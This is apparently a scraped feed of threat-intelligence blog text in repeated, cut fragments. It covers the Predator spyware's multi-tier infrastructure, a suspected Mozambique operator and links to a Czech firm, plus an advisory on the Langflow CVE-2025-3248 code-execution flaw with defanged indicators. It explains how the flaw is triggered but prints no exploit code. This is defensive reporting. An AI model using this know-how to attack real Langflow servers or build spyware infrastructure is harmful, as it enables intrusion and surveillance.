Group has observed that Tier 1 servers consistently communicate with a dedicated Tier 2 upstream virtual private server (VPS) IP address using Transmission Control Protocol (TCP) port 10514. These upstream servers likely function as anonymization hop points, making it more difficult to associate Tier 1 servers directly with individual Predator customers. Communication over TCP port 10514 is also consistently observed between Tier 2 and Tier 3 servers. Subsequently, Tier 3 servers relay traffic to the Tier 4 layer, which appears to correspond to static, in-country ISP IP addresses suspected to be under the control of Predator customers. In every instance analyzed, both the Tier 1 servers and their corresponding upstream servers appeared to be dedicated exclusively to a single customer.</p>\n        <p>While only Tiers 1 through 4 appear directly connected to the operational infrastructure of Predator customers, Insikt Group has also been monitoring an additional layer, tracked as Tier 5, that seems to play a central, though still unclear, role in Predator-related operations. Tier 5 servers have been linked to an entity in the Czech Republic, FoxITech s.r.o., which has previously been publicly associated with Intellexa and is discussed further in the Connection to Czech Entity section.</p>\n        <h3>Suspected Predator Usage Within Specific Countries</h3>\n        <p>Since Insikt Group began reporting on Predator in March 2024, suspected operators of the spyware have been identified in over a dozen countries worldwide. While several of these operators have remained active in the past twelve months, activity appears to have ceased in some locations, likely due to public reporting, leading to an overall lower number of current Predator operators. For example, in the Democratic Republic of the Congo (DRC), operations seem to have stopped about two weeks after Insikt Group published its findings on DRC-linked activity in September 2024. Similarly, the suspected operator in Angola became inactive around the same period, only to resume activity in early 2025, based on Recorded Future Network Intelligence. Additionally, Insikt Group has uncovered evidence of Predator use in Mozambique — a country where no Predator operators had been identified before this report.</p>\n        <h4>Mozambique</h4>\n        <p>Drawing on Recorded Future Network Intelligence and other artifacts, Insikt Group attributes the domains listed in <strong>Table 1</strong> with high confidence to a suspected Predator operator based in Mozambique. Additionally, several other domains, including <em>mdundobeats[.]com</em>, <em>noticiafamosos[.]com</em>, and <em>onelifestyle24[.]com</em>, as well as others from <strong>Appendix B</strong>, are likely linked to the same customer based on various technical indicators in Recorded Future sources. Notably, all IP addresses associated with these domains, except for the one hosting <em>onelifestyle24[.]com</em>, fall within the same two /24 CIDR ranges. Insikt Group further assesses, using both Recorded Future Network Intelligence and passive DNS data, that the suspected Predator operator in Mozambique became active during the first half of 2024 and still appears to be active at the time of writing.</p>\n        <div>\n          <div>\n            <div><strong>Domain</strong></div>\n            <div><strong>IP Address</strong></div>\n            <div><strong>Notes</strong></div>\n          </div>\n          <div>\n            <div>canylane[.]com</div>\n            <div>169[.]239[.]128[.]42</div>\n            <div>N/A</div>\n          </div>\n          <div>\n            <div>flickerxxx[.]com</div>\n            <div>169[.]239[.]129[.]57</div>\n            <div>Potentially impersonates the legitimate online photo-sharing and hosting platform Flickr (flickr[.]com)</div>\n          </div>\n          <div>\n            <div>mundoautopro[.]com</div>\n            <div>169[.]239[.]128[.]48</div>\n            <div>N/A</div>\n          </div>\n          <div>\n            <div>noticiafresca[.]net</div>\n            <div>169[.]239[.]128[.]46</div>\n            <div>Likely impersonates the legitimate Mozambique-based news website of Notícias Frescas MZ (noticiasfrescasmz[.]com)</div>\n          </div>\n        </div>\n        <p><strong><em>Table 1:</em></strong> <em>Domains and IP addresses linked to Predator customer located in Mozambique (Source: Recorded Future)</em></p>\n        <p>Although there has been no public reporting to date linking Predator to Mozambique, earlier investigations have connected the country to other forms of surveillance. In 2021, a report, drawing on a <a href=\"https://citizenlab.ca/2018/09/hide-and-seek-tracking-nso-groups-pegasus-spyware-to-operations-in-45-countries/\">2018 Citizen Lab analysis</a>, <a href=\"https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/\">suggested</a> that Mozambique was likely a Pegasus operator (there were no confirmed Pegasus infections within Mozambique at that time). Additionally, a 2016 report by the Mozambican investigative outlet Verdade <a href=\"https://advox.globalvoices.org/2016/05/16/the-government-of-mozambique-is-spying-on-its-citizens-according-to-verdade/\">revealed</a> that the government had acquired and was using advanced surveillance technologies to monitor citizens’ communications.</p>\n        <h4>Additional Cluster Linked to Eastern European Country</h4>\n        <p>While many of the identified domains and IP addresses can be attributed to specific suspected operators in particular countries, attribution is less straightforward in other cases. Technical indicators frequently connect multiple domains and IP addresses into distinct clusters, which Insikt Group assesses are likely controlled by the same operator.</p>\n        <p>One such cluster was notable for its brief period of activity. Recorded Future Network Intelligence indicates this cluster was active only from August to November 2024 and likely consisted of just two sets of Tier 1 to Tier 4 servers. This cluster could represent testing and development operations due to its brevity, or it could be linked to an Eastern European operator on account of its location. Currently, <em>speedbrawse[.]com</em> is the sole domain associated with this cluster. Insikt Group assesses that the abrupt halt in activity of this operator may also be linked to the <a href=\"https://home.treasury.gov/news/press-releases/jy2581\">escalation</a> of sanctions against Intellexa in September 2024.</p>\n        <h3>Connection to Czech Entity</h3>\n        <p>During the investigation into the use of Predator against the Greek journalist Thanasis Koukakis and others, Greece’s Supreme Court prosecutor <a href=\"https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/\">directed</a> the financial police to compile a report on companies connected to the Intellexa Consortium — a document later obtained by the Czech investigative outlet Investigace.cz. This report features a supplier table listing entities associated with Intellexa, including an individual named Dvir Horef Hazan. He, along with the connections described in the report, is shown in <strong>Figure 6</strong>.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Predator3-003.png\" src=\"https://www.recordedfuture.com/media_1684773ea007b27b600af21c30841576e8e9d2f11.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"882\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 6:</em></strong> <em>Connections between Predator infrastructure and FoxITech s.r.o. (Source: Investigace.cz, Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Investigations by the Czech outlet <a href=\"https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/\">found</a> that Hazan, a Czech bistro owner, programmer, and entrepreneur with ownership of at least eight Czech companies, with four specializing in marketing, consulting, and IT advisory, allegedly worked for Intellexa. Greek police reports show that Intellexa transferred nearly €3 million to Hazan and three of his companies (Zambrano Trade s.r.o., Hadastech s.r.o., and Shilo s.r.o.) for unspecified services. Additionally, Importgenius records reveal that Hadastech, solely directed by Hazan, received 40 shipments from an unidentified Ukrainian company between 2020 and 2021, described as mobile phones and \"other networking apparatus.\"</p>\n        <p>Further analysis shows that Hazan is also indirectly linked to FoxITech s.r.o., a Czech company based in Krnov and owned by Michal Ikonomidis, which claims to provide integrated IT and business services, including software development, cybersecurity, HR recruitment, and back-office support, to clients globally. More specifically, FoxITech s.r.o. is headquartered in a building owned by one of Hazan’s companies, which also houses the other previously mentioned Hazan-owned businesses. This link between Hazan and FoxITech s.r.o. is further evidenced by Hazan and Ikonomidis appearing to be friends, based on social media, and the fact that Hazan’s first company and FoxITech s.r.o. were both registered at the notary’s office by the same proxy. Moreover, RIPE (Réseaux IP Européens) entries linked to FoxITech s.r.o. include email addresses associated with Hazan’s company, Shilo s.r.o. According to Investigace.cz, an email sent to FoxITech s.r.o. was answered from an address belonging to one of Hazan’s companies, Bender ONE s.r.o.</p>\n        <p>Although the precise nature and purpose of the connection between FoxITech s.r.o. and Predator operations remain unclear, Insikt Group has observed that Tier 4 servers regularly communicate with Tier 5 infrastructure, which is linked to FoxITech s.r.o. This establishes a link between Predator’s multi-tiered infrastructure and the Czech entity, marking the first technical connection made between Predator infrastructure and corporate entities associated with the Intellexa Consortium.</p>\n        <p>Notably, Investigace.cz previously <a href=\"https://vsquare.org/greece-czech-republic-intellexa-cytrox-spyware/\">reported</a> on Cytrox in the Czech Republic, revealing that the company’s listed director was a pensioner from a village near Ostrava, unaware of Intellexa. She knew Hazan, a family acquaintance living nearby. Also, her daughter’s husband, Amos Uzan, is an Israeli who worked in government security and communications roles from 2003–2009, during Ehud Olmert’s tenure as Prime Minister. Olmert had previously disclosed that he was a paid advisor to Intellexa between 2006 to 2009.</p>\n        <h2>Outlook</h2>\n        <p>Insikt Group has uncovered evidence indicating the continued use of Predator, including in Mozambique, despite widespread media attention and sanctions targeting Intellexa and related entities. Although recent activity has been observed, the reduced number of suspected operators compared to earlier reports suggests that public exposure, sanctions, and related measures have likely imposed operational costs on Intellexa. Moreover, while Predator operators historically maintained a consistent modus operandi, the latest findings reveal the adoption of new tactics to evade detection. Sanctions and other pressures are likely to drive efforts to increase the complexity of corporate structures, making operations harder to trace and disrupt. The continued spread of Predator and similar spyware products, as well as the availability of hack-for-hire services beyond legitimate law enforcement and counterterrorism uses, presents a significant risk to a broad range of organizations and individuals.</p>\n        <p>To read the entire analysis, <a href=\"https://assets.recordedfuture.com/insikt-report-pdfs/2025/cta-2025-0612.pdf\">click

Group and others throughout the last two years, alongside US government sanctions targeting the Intellexa Consortium — the organizational structure behind the Predator mobile spyware — Insikt Group observed a significant decline in Predator-related activity. This apparent decline raised questions about whether the combination of US sanctions, public exposure, and broader international efforts to curb spyware proliferation, such as the UK and France-led Pall Mall process, had dealt a lasting blow to Intellexa’s operations. Yet, Predator activity has not stopped, and in recent months, Insikt Group has observed a resurgence of activity, reflecting the operators’ continued persistence. While much of the identified infrastructure is tied to known Predator operators in countries previously identified by Insikt Group, a new customer has also been identified in Mozambique — a country not previously publicly linked to the spyware. This aligns with the broader observation that Predator is highly active in Africa, with over half of its identified customers located on the continent. Additionally, Insikt Group has found a connection between high-tier Predator infrastructure and a Czech entity previously associated with the Intellexa Consortium.\nThe deployment of spyware like Predator beyond legitimate criminal or counterterrorism use poses serious threats to privacy, legal rights, and the physical safety of both direct targets and associated individuals. While most known cases of abuse have targeted civil society and political activists, individuals and organizations in regions with a record of spyware misuse should remain vigilant, regardless of sector. Given Predator’s expensive licensing model, its use is typically reserved for high-value, strategic targets. This makes politicians, corporate executives, and others in sensitive positions especially vulnerable due to the intelligence they may possess. The use of spyware against political opposition figures is currently under investigation in several EU countries, reflecting wider global efforts to curb the activities of mercenary spyware developers.\nAs outlined in Insikt Group’s previous reports on Predator, defenders should follow recommended best practices. These include ensuring personal and corporate devices are kept separate, regularly updating phones, encouraging periodic device reboots (though this may not always fully eliminate Predator), using lockdown mode, and implementing a mobile device management (MDM) system. Additionally, investing in security awareness training for employees and fostering a culture of minimal data exposure are essential for reducing the risk of successful spearphishing attacks and limiting data theft in the event of a breach.\nInsikt Group expects the mercenary spyware market to continue expanding, fueled by sustained demand and corporate profitability. This growth will likely be accompanied by ongoing innovation, as rising competition and strengthened IT security among targets drive the development of new products and techniques. For instance, as defenders work to eliminate entire classes of vulnerabilities, spyware operators may adapt by targeting alternatives such as cloud backups accessed via stolen credentials or by employing new deployment methods. As these tools proliferate and techniques evolve, the range of victims is likely to extend beyond civil society, influencing political discourse and sparking further legal confrontations. Recent court rulings in favor of technology companies against spyware vendors may set a precedent, encouraging more firms to actively challenge the misuse of their platforms. Insikt Group anticipates that spyware vendors will continue leveraging complex corporate structures to evade sanctions or detection, while increasingly tailoring their operations to specific regions, a trend often described as the balkanization of the ecosystem.\nKey Findings\nInsikt Group has identified new infrastructure associated with Predator, indicating continued operations despite public exposure, international sanctions, and policy interventions.\nThe newly identified infrastructure includes both victim-facing Tier 1 servers as well as high-tier components that likely link back to Predator operators in various countries.\nAlthough much of Predator’s infrastructure remains consistent with previous reporting, its operators have introduced changes designed to further evade detection — a pattern Insikt Group noted in earlier reporting.\nInsikt Group has detected Predator-related activity in several countries throughout the last twelve months and is the first to report a suspected Predator operator presence in Mozambique.\nInsikt Group also connected components of Predator’s infrastructure to a Czech entity previously linked with the Intellexa Consortium by a Czech investigative outlet.\nBackground\nPredator is a sophisticated mercenary spyware targeting both Android and iPhone devices and has been active since at least 2019. Originally developed by Cytrox and now operated under the Intellexa alliance, Predator is engineered for flexibility and stealth, leaving minimal evidence on infected devices and making external investigations into abuse particularly challenging. Once deployed, Predator provides complete access to a device’s microphone, camera, and all data — such as contacts, messages, photos, and videos — without the victim’s awareness. The spyware’s modular design, based on Python, allows operators to introduce new features remotely, without the need to re-exploit the device.\nPredator can be delivered through both \"1-click\" and \"zero-click\" attack vectors. \"1-click\" attacks rely on social engineering messages with malicious links that require user interaction (1, 2, 3), while \"zero-click\" attacks, described in the \"Predator Files,\" involve techniques that do not require any action from the target, such as network injection or proximity-based methods. However, there have been no confirmed cases of Predator using fully remote \"zero-click\" exploits like those seen with NSO Group Pegasus, which can compromise devices through messaging apps without any user interaction (for example, FORCEDENTRY or BLASTPASS).\nOver the past two years, Insikt Group has identified suspected Predator operators in more than a dozen countries, including in Angola, Armenia, Botswana, the Democratic Republic of the Congo, Egypt, Indonesia, Kazakhstan, Mongolia, Mozambique, Oman, the Philippines, Saudi Arabia, and Trinidad and Tobago (1, 2). Notably, this is the first public report to identify Mozambique as a suspected customer. While Predator is ostensibly marketed for counterterrorism and law enforcement purposes, previous reporting has documented a clear pattern of its deployment against civil society actors, including journalists and activists, and politicians (1, 2, 3, 4). These instances described in earlier reports likely represent only a small portion of the overall abuses, given the widespread use of mercenary spyware like Predator, the difficulty of detection, and limited victim support. It is important to emphasize the risk of cross-border targeting, which has been observed not only with Predator, where an operator linked to Vietnam has targeted EU officials and members of the European Parliament, but also with other mercenary spyware, such as Pegasus.\nDespite increased public reporting on Predator’s infrastructure and techniques, as well as growing attention to Intellexa’s corporate structure, Predator operations remain active. This persistence continues even after measures such as US sanctions, an EU resolution, a US visa ban on Intellexa affiliates, and the launch of the Pall Mall Process, alongside likely rising exploit costs, particularly for iPhones. This likely reflects growing demand for spyware tools, especially in countries facing export restrictions, ongoing technical innovation in response to public reporting and security enhancements, and increasingly complex corporate structures designed to impede sanctions and attribution. One such example, involving a Czech entity likely linked to Predator operations, is discussed later in this report.\nThreat Analysis\nTier 1 (C2) Servers\nInsikt Group has identified new victim-facing Tier 1 (C2) infrastructure that is highly likely associated with Predator, including domains and IP addresses. Although the specific functions of these domains and IP addresses have not yet been confirmed, they are probably involved in payload delivery and the exploitation process, consistent with previous infrastructure linked to Predator. A table in Appendix B presents the domains and IP addresses observed over the past twelve months.\nPreviously, domains linked to Predator often impersonated specific organizations, such as frequently visited local news outlets, as Insikt Group has reported in the past (1, 2). However, this pattern began to gradually shift following increased media attention and public reporting from the end of 2023 onward. More recent domains now typically consist of two or more seemingly random English words. Insikt Group has observed that some of these domains reuse particular keywords; for instance, both boundbreeze[.]com and branchbreeze[.]com share the word \"breeze\". In a few recent cases, domains feature Portuguese-language words, which likely reflect the language of intended targets. Additionally, certain domains contain keywords that could provide clues to their targeting, such as keep-badinigroups[.]com, which may refer to communities or groups associated with the Badini dialect spoken in the Badinan region of Iraqi Kurdistan.\nThe majority of identified domains have been registered through the registrar PDR Ltd. d/b/a PublicDomainRegistry.com and typically use name servers associated with orderbox-dns[.]com, among others. While Predator infrastructure has historically favored certain autonomous system numbers (ASNs) such as AS62005, AS61138, and AS44066, Insikt Group has observed that more recent Predator-linked domains are being hosted on a broader range of ASNs — including AS42708, AS20473, and AS44477 — which have not previously been connected to Predator activity. Notably, Insikt Group also identified at least one instance where a server tied to higher-tier Predator infrastructure was hosted with Stark Industries.\nSuspected Infrastructure Detection Evasion Strategies\nIn response to ongoing public exposure, the operators behind Predator have adopted various tactics to evade detection. These involve using more varied server configurations than previously reported, expanding the diversity of ASNs, and introducing additional layers to their multi-tiered infrastructure, among other approaches. One notable strategy involves the use of fake websites, which generally fall into four main categories: fake 404 error pages, counterfeit login or registration pages, sites indicating that they are under construction, and websites purporting to be associated with specific entities, such as a conference (see Figures 1-4).\nFigures 1-4: Example websites linked to Predator (Source: Recorded Future)\nMulti-Tiered Infrastructure\nAs previously reported by Insikt Group, Predator customers continue to use a multi-tiered infrastructure network, which is likely designed to enable the targeting of specific individuals or entities (see Figure 5). This network closely resembles the high-level architecture outlined in Amnesty’s October 2023 report, but it has continued to evolve since then. Earlier versions of Predator’s multi-tiered infrastructure, reported by Insikt Group in March 2024, featured only three layers. The addition of a fourth layer in the current design is likely intended to further obscure the identification of countries suspected of deploying Predator.\nFigure 5: Multi-tiered infrastructure linked to Predator (Source: Recorded Future)\nLeveraging Recorded Future® Network Intelligence, Insikt Group has observed that Tier 1 servers consistently communicate with a dedicated Tier 2 upstream virtual private server (VPS) IP address using Transmission Control Protocol (TCP) port 10514. These upstream servers likely function as anonymization hop points, making it more difficult to associate Tier 1 servers directly with individual Predator customers. Communication over TCP port 10514 is also consistently observed between Tier 2 and Tier 3 servers. Subsequently, Tier 3 servers relay traffic to the Tier 4 layer, which appears to correspond to static, in-country ISP IP addresses suspected to be under the control of Predator customers. In every instance analyzed, both the Tier 1 servers and their corresponding upstream servers appeared to be dedicated exclusively to a single customer.\nWhile only Tiers 1 through 4 appear directly connected to the operational infrastructure of Predator customers, Insikt Group has also been monitoring an additional layer, tracked as Tier 5, that seems to play a central, though still unclear, role in Predator-related operations. Tier 5 servers have been linked to an entity in the Czech Republic, FoxITech s.r.o., which has previously been publicly associated with Intellexa and is discussed further in the Connection to Czech Entity section.\nSuspected Predator Usage Within Specific Countries\nSince Insikt Group began reporting on Predator in March 2024, suspected operators of the spyware have been identified in over a dozen countries worldwide. While several of these operators have remained active in the past twelve months, activity appears to have ceased in some locations, likely due to public reporting, leading to an overall lower number of current Predator operators. For example, in the Democratic Republic of the Congo (DRC), operations seem to have stopped about two weeks after Insikt Group published its findings on DRC-linked activity in September 2024. Similarly, the suspected operator in Angola became inactive around the same period, only to resume activity in early 2025, based on Recorded Future Network Intelligence. Additionally, Insikt Group has uncovered evidence of Predator use in Mozambique — a country where no Predator operators had been identified before this report.\nMozambique\nDrawing on Recorded Future Network Intelligence and other artifacts, Insikt Group attributes the domains listed in Table 1 with high confidence to a suspected Predator operator based in Mozambique. Additionally, several other domains, including mdundobeats[.]com, noticiafamosos[.]com, and onelifestyle24[.]com, as well as others from Appendix B, are likely linked to the same customer based on various technical indicators in Recorded Future sources. Notably, all IP addresses associated with these domains, except for the one hosting onelifestyle24[.]com, fall within the same two /24 CIDR ranges. Insikt Group further assesses, using both Recorded Future Network Intelligence and passive DNS data, that the suspected Predator operator in Mozambique became active during the first half of 2024 and still appears to be active at the time of writing.\nDomain\nIP Address\nNotes\ncanylane[.]com\n169[.]239[.]128[.]42\nN/A\nflickerxxx[.]com\n169[.]239[.]129[.]57\nPotentially impersonates the legitimate online photo-sharing and hosting platform Flickr (flickr[.]com)\nmundoautopro[.]com\n169[.]239[.]128[.]48\nN/A\nnoticiafresca[.]net\n169[.]239[.]128[.]46\nLikely impersonates the legitimate Mozambique-based news website of Notícias Frescas MZ (noticiasfrescasmz[.]com)\nTable 1: Domains and IP addresses linked to Predator customer located in Mozambique (Source: Recorded Future)\nAlthough there has been no public reporting to date linking Predator to Mozambique, earlier investigations have connected the country to other forms of surveillance. In 2021, a report, drawing on a 2018 Citizen Lab analysis, suggested that Mozambique was likely a Pegasus operator (there were no confirmed Pegasus infections within Mozambique at that time). Additionally, a 2016 report by the Mozambican investigative outlet Verdade revealed that the government had acquired and was using advanced surveillance technologies to monitor citizens’ communications.\nAdditional Cluster Linked to Eastern European Country\nWhile many of the identified domains and IP addresses can be attributed to specific suspected operators in particular countries, attribution is less straightforward in other cases. Technical indicators frequently connect multiple domains and IP addresses into distinct clusters, which Insikt Group assesses are likely controlled by the same operator.\nOne such cluster was notable for its brief period of activity. Recorded Future Network Intelligence indicates this cluster was active only from August to November 2024 and likely consisted of just two sets of Tier 1 to Tier 4 servers. This cluster could represent testing and development operations due to its brevity, or it could be linked to an Eastern European operator on account of its location. Currently, speedbrawse[.]com is the sole domain associated with this cluster. Insikt Group assesses that the abrupt halt in activity of this operator may also be linked to the escalation of sanctions against Intellexa in September 2024.\nConnection to Czech Entity\nDuring the investigation into the use of Predator against the Greek journalist Thanasis Koukakis and others, Greece’s Supreme Court prosecutor directed the financial police to compile a report on companies connected to the Intellexa Consortium — a document later obtained by the Czech investigative outlet Investigace.cz. This report features a supplier table listing entities associated with Intellexa, including an individual named Dvir Horef Hazan. He, along with the connections described in the report, is shown in Figure 6.\nFigure 6: Connections between Predator infrastructure and FoxITech s.r.o. (Source: Investigace.cz, Recorded Future)\nInvestigations by the Czech outlet found that Hazan, a Czech bistro owner, programmer, and entrepreneur with ownership of at least eight Czech companies, with four specializing in marketing, consulting, and IT advisory, allegedly worked for Intellexa. Greek police reports show that Intellexa transferred nearly €3 million to Hazan and three of his companies (Zambrano Trade s.r.o., Hadastech s.r.o., and Shilo s.r.o.) for unspecified services. Additionally, Importgenius records reveal that Hadastech, solely directed by Hazan, received 40 shipments from an unidentified Ukrainian company between 2020 and 2021, described as mobile phones and \"other networking apparatus.\"\nFurther analysis shows that Hazan is also indirectly linked to FoxITech s.r.o., a Czech company based in Krnov and owned by Michal Ikonomidis, which claims to provide integrated IT and business services, including software development, cybersecurity, HR recruitment, and back-office support, to clients globally. More specifically, FoxITech s.r.o. is headquartered in a building owned by one of Hazan’s companies, which also houses the other previously mentioned Hazan-owned businesses. This link between Hazan and FoxITech s.r.o. is further evidenced by Hazan and Ikonomidis appearing to be friends, based on social media, and the fact that Hazan’s first company and FoxITech s.r.o. were both registered at the notary’s office by the same proxy. Moreover, RIPE (Réseaux IP Européens) entries linked to FoxITech s.r.o. include email addresses associated with Hazan’s company, Shilo s.r.o. According to Investigace.cz, an email sent to FoxITech s.r.o. was answered from an address belonging to one of Hazan’s companies, Bender ONE s.r.o.\nAlthough the precise nature and purpose of the connection between FoxITech s.r.o. and Predator operations remain unclear, Insikt Group has observed that Tier 4 servers regularly communicate with Tier 5 infrastructure, which is linked to FoxITech s.r.o. This establishes a link between Predator’s multi-tiered infrastructure and the Czech entity, marking the first technical connection made between Predator infrastructure and corporate entities associated with the Intellexa Consortium.\nNotably, Investigace.cz previously reported on Cytrox in the Czech Republic, revealing that the company’s listed director was a pensioner from a village near Ostrava, unaware of Intellexa. She knew Hazan, a family acquaintance living nearby. Also, her daughter’s husband, Amos Uzan, is an Israeli who worked in government security and communications roles from 2003–2009, during Ehud Olmert’s tenure as Prime Minister. Olmert had previously disclosed that he was a paid advisor to Intellexa between 2006 to 2009.\nOutlook\nInsikt Group has uncovered evidence indicating the continued use of Predator, including in Mozambique, despite widespread media attention and sanctions targeting Intellexa and related entities. Although recent activity has been observed, the reduced number of suspected operators compared to earlier reports suggests that public exposure, sanctions, and related measures have likely imposed operational costs on Intellexa. Moreover, while Predator operators historically maintained a consistent modus operandi, the latest findings reveal the adoption of new tactics to evade detection. Sanctions and other pressures are likely to drive efforts to increase the complexity of corporate structures, making operations harder to trace and disrupt. The continued spread of Predator and similar spyware products, as well as the availability of hack-for-hire services beyond legitimate law enforcement and counterterrorism uses, presents a significant risk to a broad range of organizations and individuals.\nTo read the entire analysis, click here to download the report as a PDF.\nAppendix A — Indicators of

Langflow is a widely used tool for building and deploying AI-powered agents and workflows. On May 5, 2025, the US Cybersecurity and Infrastructure Security Agency (<a href=\"https://www.cisa.gov/\">CISA</a>) also added CVE-2025-3248 to its <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\">Known Exploited Vulnerabilities (KEV) catalog</a>. Exploiting the vulnerability can allow remote, unauthenticated attackers to send crafted HTTP requests and execute arbitrary code by abusing Python decorators and default arguments.</p>\n        <p>Given the high risk associated with this vulnerability and ongoing exploitation attempts, it is imperative to prioritize patching CVE-2025-3248 on your company's assets to prevent unauthorized access and attackers potentially taking control of affected systems.</p>\n        <h4>Insikt Group’s Assessment of CVE-2025-3248</h4>\n        <p>CVE-2025-3248 arises from Langflow’s failure to implement appropriate input sanitization and execution control at the \"/api/v1/validate/code\" endpoint, where it insecurely uses Python’s \"compile\" and \"exec()\" function to process user-supplied code. Specifically, the vulnerability results from Langflow’s approach of validating function definitions by parsing them into an Abstract Syntax Tree (AST) and executing specific components.</p>\n        <p>The endpoint parses the user-submitted code field using \"ast.parse()\" to construct an AST. Langflow then uses Python’s compile function to convert the parsed AST into executable bytecode. During AST processing, Python evaluates argument default values and decorators immediately upon compilation. This evaluation occurs when the AST node representing the function is processed, not strictly during the ast.parse() step. If these components contain malicious payloads, they are executed as part of the compilation and execution phase.</p>\n        <p>Unauthenticated attackers can therefore craft malicious payloads embedded within argument defaults or decorators. Since Langflow does not enforce input validation or sandboxing, these payloads are compiled and executed within the server context, leading to remote code execution (RCE). In vulnerable versions, remote threat actors can submit specially crafted POST requests to the endpoint, potentially deploying reverse shell commands, data exfiltration scripts, or other malicious code without authentication or adequate restriction.</p>\n        <p>At the time of writing, there were 1,050 exposed Langflow instances on Shodan. However, not all of these are necessarily vulnerable as their specific versions are unknown. Additionally, cybersecurity firm Greynoise observed 361 malicious IP addresses attempting to exploit CVE-2025-3248, primarily targeting systems in the US, Australia, Singapore, Germany, and Mexico.</p>\n        <div>\n          <div>\n            <div>Malicious IP Address</div>\n            <div>Source Location</div>\n            <div>Target Location</div>\n          </div>\n          <div>\n            <div>45.33.95[.]165</div>\n            <div>US</div>\n            <div>Germany, Singapore, UK, India, US, Netherlands, Canada, Australia, France, Bahrain, Brazil, Italy, Japan, Mexico, South Africa, South Korea, Thailand, Finland, Hong Kong, Indonesia, Israel, UAE, Belgium, Malaysia, Taiwan</div>\n          </div>\n          <div>\n            <div>3.35.37[.]70</div>\n            <div>South Korea</div>\n            <div>France, Germany, Italy, Mexico, Netherlands, US</div>\n          </div>\n          <div>\n            <div>139.59.223[.]9</div>\n            <div>Singapore</div>\n            <div>Lithuania</div>\n          </div>\n          <div>\n            <div>35.221.194[.]209</div>\n            <div>Taiwan</div>\n            <div>Germany</div>\n          </div>\n          <div>\n            <div>204.216.147[.]144</div>\n            <div>Brazil</div>\n            <div>Taiwan, Turkey</div>\n          </div>\n        </div>\n        <p><strong><em>Table 1:</em></strong> <em>Example malicious IP addresses attempting to exploit CVE-2025-3248 (Source:</em> <em><a href=\"https://viz.greynoise.io/query/CVE-2025-3248%20tags:%22Langflow%20Code%20Injection%20CVE-2025-3248%20RCE%20Attempt%22\">Greynoise</a>)</em></p>\n        <p>Multiple proof-of-concept (PoC) exploits were also shared on GitHub; public PoC exploits often increase the likelihood of continued active exploitation.

Specifically, the vulnerability results from Langflow’s approach of validating function definitions by parsing them into an Abstract Syntax Tree (AST) and executing specific components.\nThe endpoint parses the user-submitted code field using \"ast.parse()\" to construct an AST. Langflow then uses Python’s compile function to convert the parsed AST into executable bytecode. During AST processing, Python evaluates argument default values and decorators immediately upon compilation. This evaluation occurs when the AST node representing the function is processed, not strictly during the ast.parse() step. If these components contain malicious payloads, they are executed as part of the compilation and execution phase.\nUnauthenticated attackers can therefore craft malicious payloads embedded within argument defaults or decorators. Since Langflow does not enforce input validation or sandboxing, these payloads are compiled and executed within the server context, leading to remote code execution (RCE). In vulnerable versions, remote threat actors can submit specially crafted POST requests to the endpoint, potentially deploying reverse shell commands, data exfiltration scripts, or other malicious code without authentication or adequate restriction.\nAt the time of writing, there were 1,050 exposed Langflow instances on Shodan. However, not all of these are necessarily vulnerable as their specific versions are unknown. Additionally, cybersecurity firm Greynoise observed 361 malicious IP addresses attempting to exploit CVE-2025-3248, primarily targeting systems in the US, Australia, Singapore, Germany, and Mexico.\nMalicious IP Address\nSource Location\nTarget Location\n45.33.95[.]165\nUS\nGermany, Singapore, UK, India, US, Netherlands, Canada, Australia, France, Bahrain, Brazil, Italy, Japan, Mexico, South Africa, South Korea, Thailand, Finland, Hong Kong, Indonesia, Israel, UAE, Belgium, Malaysia, Taiwan\n3.35.37[.]70\nSouth Korea\nFrance, Germany, Italy, Mexico, Netherlands, US\n139.59.223[.]9\nSingapore\nLithuania\n35.221.194[.]209\nTaiwan\nGermany\n204.216.147[.]144\nBrazil\nTaiwan, Turkey\nTable 1: Example malicious IP addresses attempting to exploit CVE-2025-3248 (Source: Greynoise)\nMultiple proof-of-concept (PoC) exploits were also shared on GitHub; public PoC exploits often increase the likelihood of continued active exploitation. Insikt Group did not test these PoCs for efficacy or accuracy.\nFigure 1: The majority of exposed Langflow instances on Shodan are geolocated in the US, China, Germany, Singapore, and the UK (Sources: Shodan, Recorded Future)\nRecommended Actions for CVE-2025-3248\nUsers should upgrade to Langflow version 1.3.0. If upgrading is not possible, secure Langflow by restricting network access through a firewall and blocking public access to the \"/api/v1/validate/code\" endpoint. Additionally, monitor logs for suspicious POST requests on the endpoint.\nHow Recorded Future Can Help:\nInsikt Group - Download the attached YAML file in this blog post to access a Nuclei template created by Insikt Group for CVE-2025-3248 that enables defenders to test potentially vulnerable Langflow instances prior to the patched version.\nAttack Surface Intelligence - Identify internet-facing assets vulnerable to CVE-2025-3248.\nVulnerability Intelligence - Gain helpful context on CVE-2025-3248 to aid in patching and prioritization discussions.\nFigure 2: Triggered Risk Rules in the Vulnerability Intelligence Card for CVE-2025-3248 in Recorded Future (Source: Recorded Future)\nFigure 3: Signature for CVE-2025-3248 in Recorded Future Attack Surface Intelligence® (Source: Recorded Future)\nAbout Insikt Group:\nRecorded Future’s Insikt Group threat research team is comprised of analysts, linguists, and security researchers with deep government and industry experience.\nInsikt Group publishes threat intelligence to the Recorded Future analyst community in blog posts and analyst notes.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/blog/media_1b0ee577cd54113c0806bb56139a196b8189051c6.png?width=1200&format=pjpg&optimize=medium"},"content":"Learn about CVE-2025-3248 affecting Langflow.

